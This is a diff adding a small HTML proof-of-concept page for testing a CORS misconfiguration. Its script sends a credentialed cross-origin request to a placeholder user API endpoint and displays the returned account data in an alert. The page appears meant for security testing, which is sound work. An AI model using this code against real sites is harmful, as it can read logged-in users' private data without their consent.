@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS PoC</title>
+    <script>
+        function testCORS() {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    var status = xhr.status;
+                    if (status === 0 || (status >= 200 && status < 400)) {
+                        // The request has been completed successfully
+                        try {
+                            var jsonResponse = JSON.parse(xhr.responseText);
+                            console.log('JSON Response', jsonResponse);
+                            alert('Success! Response: ' + JSON.stringify(jsonResponse, null, 2));
+                        } catch (e) {
+                            alert('Failed to parse JSON response: ' + e.message);
+                        }
+                    } else {
+                        // Oh no! There has been an error with the request!
+                        alert('Request failed. Returned status of ' + status);
+                    }
+                }
+            };
+            xhr.open('GET', 'http://targetapp/api/v1/user', true); // Replace with the target endpoint
+            xhr.setRequestHeader('Accept', 'application/json'); // Set to expect JSON data
+            xhr.withCredentials = true; // Include credentials in the request
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h1>CORS Misconfiguration Test Page</h1>
+    <button onclick="testCORS()">Test CORS</button>
+</body>
+</html>
